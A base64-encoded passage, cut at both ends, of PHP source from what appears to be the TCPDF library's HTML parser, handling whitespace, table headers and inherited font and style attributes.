9IHByZWdfcmVwbGFjZSgnLycuJHRoaXMtPnJlX3NwYWNlWydwJ10uJys8XC8odGR8dGh8bGl8ZHR8ZGQpPi8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCAnPC9cXDE+JywgJGh0bWwpOwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvW1xzXSs8KHRyfHRkfHRofGxpfGR0fGRkKS8nLCAnPFxcMScsICRodG1sKTsKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLycuJHRoaXMtPnJlX3NwYWNlWydwJ10uJys8KHVsfG9sfGRsfGJyKS8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCAnPFxcMScsICRodG1sKTsKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLzxcLyh0YWJsZXx0cnx0ZHx0aHxibG9ja3F1b3RlfGRkfGR0fGRsfGRpdnxkdHxoMXxoMnxoM3xoNHxoNXxoNnxocnxsaXxvbHx1bHxwKT5bXHNdKzwvJywgJzwvXFwxPjwnLCAkaHRtbCk7CgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88XC8odGR8dGgpPi8nLCAnPG1hcmtlciBzdHlsZT0iZm9udC1zaXplOjAiLz48L1xcMT4nLCAkaHRtbCk7CgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88XC90YWJsZT4oW1xzXSopPG1hcmtlciBzdHlsZT0iZm9udC1zaXplOjAiXC8+LycsICc8L3RhYmxlPicsICRodG1sKTsKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLycuJHRoaXMtPnJlX3NwYWNlWydwJ10uJys8aW1nLycuJHRoaXMtPnJlX3NwYWNlWydtJ10sIGNocigzMikuJzxpbWcnLCAkaHRtbCk7CgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88aW1nKFteXD5dKik+W1xzXSsoW15cPF0pL3hpJywgJzxpbWdcXDE+Jm5ic3A7XFwyJywgJGh0bWwpOwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPGltZyhbXlw+XSopPi94aScsICc8aW1nXFwxPjxzcGFuPjxtYXJrZXIgc3R5bGU9ImZvbnQtc2l6ZTowIi8+PC9zcGFuPicsICRodG1sKTsKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLzx4cmUvJywgJzxwcmUnLCAkaHRtbCk7IC8vIHJlc3RvcmUgcHJlIHRhZwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPHRleHRhcmVhKFteXD5dKik+KFteXDxdKik8XC90ZXh0YXJlYT4veGknLCAnPHRleHRhcmVhXFwxIHZhbHVlPSJcXDIiIC8+JywgJGh0bWwpOwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPGxpKFteXD5dKik+PFwvbGk+LycsICc8bGlcXDE+Jm5ic3A7PC9saT4nLCAkaHRtbCk7CgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88bGkoW15cPl0qKT4nLiR0aGlzLT5yZV9zcGFjZVsncCddLicqPGltZy8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCAnPGxpXFwxPjxmb250IHNpemU9IjEiPiZuYnNwOzwvZm9udD48aW1nJywgJGh0bWwpOwoJCSRodG1sID0gcHJlZ19yZXBsYWNlKCcvPChbXlw+XC9dKik+W1xzXS8nLCAnPFxcMT4mbmJzcDsnLCAkaHRtbCk7IC8vIHByZXNlcnZlIHNvbWUgc3BhY2VzCgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy9bXHNdPFwvKFteXD5dKik+LycsICcmbmJzcDs8L1xcMT4nLCAkaHRtbCk7IC8vIHByZXNlcnZlIHNvbWUgc3BhY2VzCgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88c3UoW2JwXSkvJywgJzx6d3MvPjxzdVxcMScsICRodG1sKTsgLy8gZml4IHN1Yi9zdXAgYWxpZ25tZW50CgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88XC9zdShbYnBdKT4vJywgJzwvc3VcXDE+PHp3cy8+JywgJGh0bWwpOyAvLyBmaXggc3ViL3N1cCBhbGlnbm1lbnQKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnLycuJHRoaXMtPnJlX3NwYWNlWydwJ10uJysvJy4kdGhpcy0+cmVfc3BhY2VbJ20nXSwgY2hyKDMyKSwgJGh0bWwpOyAvLyByZXBsYWNlIG11bHRpcGxlIHNwYWNlcyB3aXRoIGEgc2luZ2xlIHNwYWNlCgkJLy8gdHJpbSBzdHJpbmcKCQkkaHRtbCA9ICR0aGlzLT5zdHJpbmdUcmltKCRodG1sKTsKCQkvLyBmaXggYnIgdGFnIGFmdGVyIGxpCgkJJGh0bWwgPSBwcmVnX3JlcGxhY2UoJy88bGk+PGJyKFteXD5dKik+LycsICc8bGk+IDxiclxcMT4nLCAkaHRtbCk7CgkJLy8gZml4IGZpcnN0IGltYWdlIHRhZyBhbGlnbm1lbnQKCQkkaHRtbCA9IHByZWdfcmVwbGFjZSgnL148aW1nLycsICc8c3BhbiBzdHlsZT0iZm9udC1zaXplOjAiPjxiciAvPjwvc3Bhbj4gPGltZycsICRodG1sLCAxKTsKCQkvLyBwYXR0ZXJuIGZvciBnZW5lcmljIHRhZwoJCSR0YWdwYXR0ZXJuID0gJy8oPFtePl0rPikvJzsKCQkvLyBleHBsb2RlcyB0aGUgc3RyaW5nCgkJJGEgPSBwcmVnX3NwbGl0KCR0YWdwYXR0ZXJuLCAkaHRtbCwgLTEsIFBSRUdfU1BMSVRfREVMSU1fQ0FQVFVSRSB8IFBSRUdfU1BMSVRfTk9fRU1QVFkpOwoJCS8vIGNvdW50IGVsZW1lbnRzCgkJJG1heGVsID0gY291bnQoJGEpOwoJCSRlbGtleSA9IDA7CgkJJHRoZWFkID0gZmFsc2U7IC8vIHRydWUgd2hlbiB3ZSBhcmUgaW5zaWRlIHRoZSBUSEVBRCB0YWcKCQkka2V5ID0gMTsKCQkkbGV2ZWwgPSBhcnJheSgpOwoJCWFycmF5X3B1c2goJGxldmVsLCAwKTsgLy8gcm9vdAoJCXdoaWxlICgkZWxrZXkgPCAkbWF4ZWwpIHsKCQkJJGRvbVska2V5XSA9IGFycmF5KCk7CgkJCSRlbGVtZW50ID0gJGFbJGVsa2V5XTsKCQkJJGRvbVska2V5XVsnZWxrZXknXSA9ICRlbGtleTsKCQkJaWYgKHByZWdfbWF0Y2goJHRhZ3BhdHRlcm4sICRlbGVtZW50KSkgewoJCQkJLy8gaHRtbCB0YWcKCQkJCSRlbGVtZW50ID0gc3Vic3RyKCRlbGVtZW50LCAxLCAtMSk7CgkJCQkvLyBnZXQgdGFnIG5hbWUKCQkJCXByZWdfbWF0Y2goJy9bXC9dPyhbYS16QS1aMC05XSopLycsICRlbGVtZW50LCAkdGFnKTsKCQkJCSR0YWduYW1lID0gc3RydG9sb3dlcigkdGFnWzFdKTsKCQkJCS8vIGNoZWNrIGlmIHdlIGFyZSBpbnNpZGUgYSB0YWJsZSBoZWFkZXIKCQkJCWlmICgkdGFnbmFtZSA9PSAndGhlYWQnKSB7CgkJCQkJaWYgKCRlbGVtZW50WzBdID09ICcvJykgewoJCQkJCQkkdGhlYWQgPSBmYWxzZTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhlYWQgPSB0cnVlOwoJCQkJCX0KCQkJCQkrKyRlbGtleTsKCQkJCQljb250aW51ZTsKCQkJCX0KCQkJCSRkb21bJGtleV1bJ3RhZyddID0gdHJ1ZTsKCQkJCSRkb21bJGtleV1bJ3ZhbHVlJ10gPSAkdGFnbmFtZTsKCQkJCWlmIChpbl9hcnJheSgkZG9tWyRrZXldWyd2YWx1ZSddLCAkYmxvY2t0YWdzKSkgewoJCQkJCSRkb21bJGtleV1bJ2Jsb2NrJ10gPSB0cnVlOwoJCQkJfSBlbHNlIHsKCQkJCQkkZG9tWyRrZXldWydibG9jayddID0gZmFsc2U7CgkJCQl9CgkJCQlpZiAoJGVsZW1lbnRbMF0gPT0gJy8nKSB7CgkJCQkJLy8gKioqIGNsb3NpbmcgaHRtbCB0YWcKCQkJCQkkZG9tWyRrZXldWydvcGVuaW5nJ10gPSBmYWxzZTsKCQkJCQkkZG9tWyRrZXldWydwYXJlbnQnXSA9IGVuZCgkbGV2ZWwpOwoJCQkJCWFycmF5X3BvcCgkbGV2ZWwpOwoJCQkJCSRkb21bJGtleV1bJ2hpZGUnXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2hpZGUnXTsKCQkJCQkkZG9tWyRrZXldWydmb250bmFtZSddID0gJGRvbVsoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncGFyZW50J10pXVsnZm9udG5hbWUnXTsKCQkJCQkkZG9tWyRrZXldWydmb250c3R5bGUnXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2ZvbnRzdHlsZSddOwoJCQkJCSRkb21bJGtleV1bJ2ZvbnRzaXplJ10gPSAkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydmb250c2l6ZSddOwoJCQkJCSRkb21bJGtleV1bJ2ZvbnQtc3RyZXRjaCddID0gJGRvbVsoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncGFyZW50J10pXVsnZm9udC1zdHJldGNoJ107CgkJCQkJJGRvbVska2V5XVsnbGV0dGVyLXNwYWNpbmcnXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2xldHRlci1zcGFjaW5nJ107CgkJCQkJJGRvbVska2V5XVsnc3Ryb2tlJ10gPSAkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydzdHJva2UnXTsKCQkJCQkkZG9tWyRrZXldWydmaWxsJ10gPSAkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydmaWxsJ107CgkJCQkJJGRvbVska2V5XVsnY2xpcCddID0gJGRvbVsoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncGFyZW50J10pXVsnY2xpcCddOwoJCQkJCSRkb21bJGtleV1bJ2xpbmUtaGVpZ2h0J10gPSAkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydsaW5lLWhlaWdodCddOwoJCQkJCSRkb21bJGtleV1bJ2JnY29sb3InXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2JnY29sb3InXTsKCQkJCQkkZG9tWyRrZXldWydmZ2NvbG9yJ10gPSAkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydmZ2NvbG9yJ107CgkJCQkJJGRvbVska2V5XVsnc3Ryb2tlY29sb3InXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ3N0cm9rZWNvbG9yJ107CgkJCQkJJGRvbVska2V5XVsnYWxpZ24nXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2FsaWduJ107CgkJCQkJJGRvbVska2V5XVsndGV4dC10cmFuc2Zvcm0nXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ3RleHQtdHJhbnNmb3JtJ107CgkJCQkJJGRvbVska2V5XVsnZGlyJ10gPSAkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydkaXInXTsKCQkJCQlpZiAoaXNzZXQoJGRvbVsoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncGFyZW50J10pXVsnbGlzdHR5cGUnXSkpIHsKCQkJCQkJJGRvbVska2V5XVsnbGlzdHR5cGUnXSA9ICRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2xpc3R0eXBlJ107CgkJCQkJfQoJCQkJCS8vIHNldCB0aGUgbnVtYmVyIG9mIGNvbHVtbnMgaW4gdGFibGUgdGFnCgkJCQkJaWYgKCgkZG9tWyRrZXldWyd2YWx1ZSddID09ICd0cicpIEFORCAoIWlzc2V0KCRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2NvbHMnXSkpKSB7CgkJCQkJCSRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ2NvbHMnXSA9ICRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2NvbHMnXTsKCQkJCQl9CgkJCQkJaWYgKCgkZG9tWyRrZXldWyd2YWx1ZSddID09ICd0ZCcpIE9SICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICd0aCcpKSB7CgkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2NvbnRlbnQnXSA9ICRjc3N0YWdhcnJheTsKCQkJCQkJZm9yICgkaSA9ICgkZG9tWyRrZXldWydwYXJlbnQnXSArIDEpOyAkaSA8ICRrZXk7ICsrJGkpIHsKCQkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2NvbnRlbnQnXSAuPSBzdHJpcHNsYXNoZXMoJGFbJGRvbVskaV1bJ2Vsa2V5J11dKTsKCQkJCQkJfQoJCQkJCQkka2V5ID0gJGk7CgkJCQkJCS8vIG1hcmsgbmVzdGVkIHRhYmxlcwoJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydjb250ZW50J10gPSBzdHJfcmVwbGFjZSgnPHRhYmxlJywgJzx0YWJsZSBuZXN0ZWQ9InRydWUiJywgJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnY29udGVudCddKTsKCQkJCQkJLy8gcmVtb3ZlIHRoZWFkIHNlY3Rpb25zIGZyb20gbmVzdGVkIHRhYmxlcwoJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydjb250ZW50J10gPSBzdHJfcmVwbGFjZSgnPHRoZWFkPicsICcnLCAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydjb250ZW50J10pOwoJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydjb250ZW50J10gPSBzdHJfcmVwbGFjZSgnPC90aGVhZD4nLCAnJywgJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnY29udGVudCddKTsKCQkJCQl9CgkJCQkJLy8gc3RvcmUgaGVhZGVyIHJvd3Mgb24gYSBuZXcgdGFibGUKCQkJCQlpZiAoCgkJCQkJCSgkZG9tWyRrZXldWyd2YWx1ZSddID09PSAndHInKQoJCQkJCQkmJiAhZW1wdHkoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsndGhlYWQnXSkKCQkJCQkJJiYgKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3RoZWFkJ10gPT09IHRydWUpCgkJCQkJKSB7CgkJCQkJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWyd0aGVhZCddKSkgewoJCQkJCQkJJGRvbVsoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsncGFyZW50J10pXVsndGhlYWQnXSA9ICRjc3N0YWdhcnJheS4kYVskZG9tWygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydwYXJlbnQnXSldWydlbGtleSddXTsKCQkJCQkJfQoJCQkJCQlmb3IgKCRpID0gJGRvbVska2V5XVsncGFyZW50J107ICRpIDw9ICRrZXk7ICsrJGkpIHsKCQkJCQkJCSRkb21bKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3BhcmVudCddKV1bJ3RoZWFkJ10gLj0gJGFbJGRvbVskaV1bJ2Vsa2V5J11dOwoJCQkJCQl9CgkJCQkJCWlmICghaXNzZXQoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnYXR0cmlidXRlJ10pKSB7CgkJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydhdHRyaWJ1dGUnXSA9IGFycmF5KCk7CgkJCQkJCX0KCQkJCQkJLy8gaGVhZGVyIGVsZW1lbnRzIG11c3QgYmUgYWx3YXlzIGNvbnRhaW5lZCBpbiBhIHNpbmdsZSBwYWdlCgkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2F0dHJpYnV0ZSddWydub2JyJ10gPSAndHJ1ZSc7CgkJCQkJfQoJCQkJCWlmICgoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndGFibGUnKSBBTkQgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWyd0aGVhZCddKSkpIHsKCQkJCQkJLy8gcmVtb3ZlIHRoZSBub2JyIGF0dHJpYnV0ZXMgZnJvbSB0aGUgdGFibGUgaGVhZGVyCgkJCQkJCSRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3RoZWFkJ10gPSBzdHJfcmVwbGFjZSgnIG5vYnI9InRydWUiJywgJycsICRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ3RoZWFkJ10pOwoJCQkJCQkkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWyd0aGVhZCddIC49ICc8L3RhYmxlaGVhZD4nOwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJLy8gKioqIG9wZW5pbmcgb3Igc2VsZi1jbG9zaW5nIGh0bWwgdGFnCgkJCQkJJGRvbVska2V5XVsnb3BlbmluZyddID0gdHJ1ZTsKCQkJCQkkZG9tWyRrZXldWydwYXJlbnQnXSA9IGVuZCgkbGV2ZWwpOwoJCQkJCWlmICgoc3Vic3RyKCRlbGVtZW50LCAtMSwgMSkgPT0gJy8nKSBPUiAoaW5fYXJyYXkoJGRvbVska2V5XVsndmFsdWUnXSwgJHNlbGZjbG9zaW5ndGFncykpKSB7CgkJCQkJCS8vIHNlbGYtY2xvc2luZyB0YWcKCQkJCQkJJGRvbVska2V5XVsnc2VsZiddID0gdHJ1ZTsKCQkJCQl9IGVsc2UgewoJCQkJCQkvLyBvcGVuaW5nIHRhZwoJCQkJCQlhcnJheV9wdXNoKCRsZXZlbCwgJGtleSk7CgkJCQkJCSRkb21bJGtleV1bJ3NlbGYnXSA9IGZhbHNlOwoJCQkJCX0KCQkJCQkvLyBjb3B5IHNvbWUgdmFsdWVzIGZyb20gcGFyZW50CgkJCQkJJHBhcmVudGtleSA9IDA7CgkJCQkJaWYgKCRrZXkgPiAwKSB7CgkJCQkJCSRwYXJlbnRrZXkgPSAkZG9tWyRrZXldWydwYXJlbnQnXTsKCQkJCQkJJGRvbVska2V5XVsnaGlkZSddID0gJGRvbVskcGFyZW50a2V5XVsnaGlkZSddOwoJCQkJCQkkZG9tWyRrZXldWydmb250bmFtZSddID0gJGRvbVskcGFyZW50a2V5XVsnZm9udG5hbWUnXTsKCQkJCQkJJGRvbVska2V5XVsnZm9udHN0eWxlJ10gPSAkZG9tWyRwYXJlbnRrZXldWydmb250c3R5bGUnXTsKCQkJCQkJJGRvbVska2V5XVsnZm9udHNpemUnXSA9ICRkb21bJHBhcmVudGtleV1bJ2ZvbnRzaXplJ107CgkJCQkJCSRkb21bJGtleV1bJ2ZvbnQtc3RyZXRjaCddID0gJGRvbVskcGFyZW50a2V5XVsnZm9udC1zdHJldGNoJ107CgkJCQkJCSRkb21bJGtleV1bJ2xldHRlci1zcGFjaW5nJ10gPSAkZG9tWyRwYXJlbnRrZXldWydsZXR0ZXItc3BhY2luZyddOwoJCQkJCQkkZG9tWyRrZXldWydzdHJva2UnXSA9ICRkb21bJHBhcmVudGtleV1bJ3N0cm9rZSddOwoJCQkJCQkkZG9tWyRrZXldWydmaWxsJ10gPSAkZG9tWyRwYXJlbnRrZXldWydmaWxsJ107CgkJCQkJCSRkb21bJGtleV1bJ2NsaXAnXSA9ICRkb21bJHBhcmVudGtleV1bJ2NsaXAnXTsKCQkJCQkJJGRvbVska2V5XVsnbGluZS1oZWlnaHQnXSA9ICRkb21bJHBhcmVudGtleV1bJ2xpbmUtaGVpZ2h0J107CgkJCQkJCSRkb21bJGtleV1bJ2JnY29sb3InXSA9ICRkb21bJHBhcmVudGtleV1bJ2JnY29sb3InXTsKCQkJCQkJJGRvbVska2V5XVsnZmdjb2xvciddID0gJGRvbVskcGFyZW50a2V5XVsnZmdjb2xvciddOwoJCQkJCQkkZG9tWyRrZXldWydzdHJva2Vjb2xvciddID0gJGRvbVskcGFyZW50a2V5XVsnc3Ryb2tlY29sb3InXTsKCQkJCQkJJGRvbVska2V5XVsnYWxpZ24nXSA9ICRkb21bJHBhcmVudGtleV1bJ2FsaWduJ107CgkJCQkJCSRkb21bJGtleV1bJ2xpc3R0eXBlJ10gPSAkZG9tWyRwYXJlbnRrZXldWydsaXN0dHlwZSddOwoJCQkJCQkkZG9tWyRrZXldWyd0ZXh0LWluZGVudCddID0gJGRvbVskcGFyZW50a2V5XVsndGV4dC1pbmRlbnQnXTsKCQkJCQkJJGRvbVska2V5XVsndGV4dC10cmFuc2Zvcm0nXSA9ICRkb21bJHBhcmVudGtleV1bJ3RleHQtdHJhbnNmb3JtJ107CgkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddID0gYXJyYXkoKTsKCQkJCQkJJGRvbVska2V5XVsnZGlyJ10gPSAkZG9tWyRwYXJlbnRrZXldWydkaXInXTsKCQkJCQl9CgkJCQkJLy8gZ2V0IGF0dHJpYnV0ZXMKCQkJCQlwcmVnX21hdGNoX2FsbCgnLyhbXj1cc10qKVtcc10qPVtcc10qIihbXiJdKikiLycsICRlbGVtZW50LCAkYXR0cl9hcnJheSwgUFJFR19QQVRURVJOX09SREVSKTsKCQkJCQkkZG9tWyRrZXldWydhdHRyaWJ1dGUnXSA9IGFycmF5KCk7IC8vIHJlc2V0IGF0dHJpYnV0ZSBhcnJheQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJGF0dHJfYXJyYXlbMV0gYXMgJGlkID0+ICRuYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkb21bJGtleV1bJ2F0dHJpYnV0ZSddW3N0cnRvbG93ZXIoJG5hbWUpXSA9ICRhdHRyX2FycmF5WzJdWyRpZF07CiAgICAgICAgICAgICAgICAgICAgfQoJCQkJCWlmICghZW1wdHkoJGNzcykpIHsKCQkJCQkJLy8gbWVyZ2UgQ1NTIHN0eWxlIHRvIGN1cnJlbnQgc3R5bGUKCQkJCQkJbGlzdCgkZG9tWyRrZXldWydjc3NzZWwnXSwgJGRvbVska2V5XVsnY3NzZGF0YSddKSA9IFRDUERGX1NUQVRJQzo6Z2V0Q1NTZGF0YUFycmF5KCRkb20sICRrZXksICRjc3MpOwoJCQkJCQkkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3R5bGUnXSA9IFRDUERGX1NUQVRJQzo6Z2V0VGFnU3R5bGVGcm9tQ1NTYXJyYXkoJGRvbVska2V5XVsnY3NzZGF0YSddKTsKCQkJCQl9CgkJCQkJLy8gc3BsaXQgc3R5bGUgYXR0cmlidXRlcwoJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3R5bGUnXSkgQU5EICFlbXB0eSgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3R5bGUnXSkpIHsKCQkJCQkJLy8gZ2V0IHN0eWxlIGF0dHJpYnV0ZXMKCQkJCQkJcHJlZ19tYXRjaF9hbGwoJy8oW147OlxzXSopOihbXjtdKikvJywgJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3N0eWxlJ10sICRzdHlsZV9hcnJheSwgUFJFR19QQVRURVJOX09SREVSKTsKCQkJCQkJJGRvbVska2V5XVsnc3R5bGUnXSA9IGFycmF5KCk7IC8vIHJlc2V0IHN0eWxlIGF0dHJpYnV0ZSBhcnJheQogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCRzdHlsZV9hcnJheVsxXSBhcyAkaWQgPT4gJG5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGluIGNhc2Ugb2YgZHVwbGljYXRlIGF0dHJpYnV0ZSB0aGUgbGFzdCByZXBsYWNlIHRoZSBwcmV2aW91cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRvbVska2V5XVsnc3R5bGUnXVtzdHJ0b2xvd2VyKCRuYW1lKV0gPSB0cmltKCRzdHlsZV9hcnJheVsyXVskaWRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQoJCQkJCQkvLyAtLS0gZ2V0IHNvbWUgc3R5bGUgYXR0cmlidXRlcyAtLS0KCQkJCQkJLy8gdGV4dCBkaXJlY3Rpb24KCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2RpcmVjdGlvbiddKSkgewoJCQkJCQkJJGRvbVska2V5XVsnZGlyJ10gPSAkZG9tWyRrZXldWydzdHlsZSddWydkaXJlY3Rpb24nXTsKCQkJCQkJfQoJCQkJCQkvLyBkaXNwbGF5CgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydkaXNwbGF5J10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydoaWRlJ10gPSAodHJpbShzdHJ0b2xvd2VyKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2Rpc3BsYXknXSkpID09ICdub25lJyk7CgkJCQkJCX0KCQkJCQkJLy8gZm9udCBmYW1pbHkKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtZmFtaWx5J10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydmb250bmFtZSddID0gJHRoaXMtPmdldEZvbnRGYW1pbHlOYW1lKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtZmFtaWx5J10pOwoJCQkJCQl9CgkJCQkJCS8vIGxpc3Qtc3R5bGUtdHlwZQoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnbGlzdC1zdHlsZS10eXBlJ10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydsaXN0dHlwZSddID0gdHJpbShzdHJ0b2xvd2VyKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2xpc3Qtc3R5bGUtdHlwZSddKSk7CgkJCQkJCQlpZiAoJGRvbVska2V5XVsnbGlzdHR5cGUnXSA9PSAnaW5oZXJpdCcpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydsaXN0dHlwZSddID0gJGRvbVskcGFyZW50a2V5XVsnbGlzdHR5cGUnXTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQkvLyB0ZXh0LWluZGVudAoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsndGV4dC1pbmRlbnQnXSkpIHsKCQkJCQkJCSRkb21bJGtleV1bJ3RleHQtaW5kZW50J10gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3RleHQtaW5kZW50J10pOwoJCQkJCQkJaWYgKCRkb21bJGtleV1bJ3RleHQtaW5kZW50J10gPT0gJ2luaGVyaXQnKSB7CgkJCQkJCQkJJGRvbVska2V5XVsndGV4dC1pbmRlbnQnXSA9ICRkb21bJHBhcmVudGtleV1bJ3RleHQtaW5kZW50J107CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJLy8gdGV4dC10cmFuc2Zvcm0KCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ3RleHQtdHJhbnNmb3JtJ10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWyd0ZXh0LXRyYW5zZm9ybSddID0gJGRvbVska2V5XVsnc3R5bGUnXVsndGV4dC10cmFuc2Zvcm0nXTsKCQkJCQkJfQoJCQkJCQkvLyBmb250IHNpemUKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtc2l6ZSddKSkgewoJCQkJCQkJJGZzaXplID0gdHJpbSgkZG9tWyRrZXldWydzdHlsZSddWydmb250LXNpemUnXSk7CgkJCQkJCQkkZG9tWyRrZXldWydmb250c2l6ZSddID0gJHRoaXMtPmdldEhUTUxGb250VW5pdHMoJGZzaXplLCAkZG9tWzBdWydmb250c2l6ZSddLCAkZG9tWyRwYXJlbnRrZXldWydmb250c2l6ZSddLCAncHQnKTsKCQkJCQkJfQoJCQkJCQkvLyBmb250LXN0cmV0Y2gKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtc3RyZXRjaCddKSkgewoJCQkJCQkJJGRvbVska2V5XVsnZm9udC1zdHJldGNoJ10gPSAkdGhpcy0+Z2V0Q1NTRm9udFN0cmV0Y2hpbmcoJGRvbVska2V5XVsnc3R5bGUnXVsnZm9udC1zdHJldGNoJ10sICRkb21bJHBhcmVudGtleV1bJ2ZvbnQtc3RyZXRjaCddKTsKCQkJCQkJfQoJCQkJCQkvLyBsZXR0ZXItc3BhY2luZwoJCQkJCQlpZiAoaXNzZXQoJGRv